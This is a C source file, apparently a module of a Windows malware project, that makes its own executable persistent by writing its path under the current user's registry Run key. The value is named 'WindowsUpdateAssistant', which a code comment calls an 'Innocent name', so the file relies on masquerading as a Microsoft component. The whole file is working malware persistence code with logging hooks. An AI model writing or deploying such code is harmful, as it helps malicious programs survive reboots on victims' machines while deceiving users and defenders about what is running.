// registry_run.c – Chave Run no registro
#include <windows.h>
#include <stdio.h>
#include "../../utils/logger.h"

void Persist_RegistryRun() {
    HKEY hKey;
    char szPath[MAX_PATH];
    const char* subkey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    const char* valueName = "WindowsUpdateAssistant"; // Innocent name

    // 1. Get executable path
    if (GetModuleFileNameA(NULL, szPath, MAX_PATH) == 0) return;

    // 2. Open Key (HKCU first, then HKLM if fails/elevated)
    LONG lResult = RegOpenKeyExA(HKEY_CURRENT_USER, subkey, 0, KEY_SET_VALUE, &hKey);
    
    if (lResult == ERROR_SUCCESS) {
        // 3. Set Value
        lResult = RegSetValueExA(hKey, valueName, 0, REG_SZ, (BYTE*)szPath, strlen(szPath) + 1);
        RegCloseKey(hKey);
        
        if (lResult == ERROR_SUCCESS) {
            Log("Persistence: Registry Run key set (HKCU)");
        } else {
            Log("Persistence: Failed to set Registry value");
        }
    } else {
        Log("Persistence: Failed to open Registry key");
    }
}
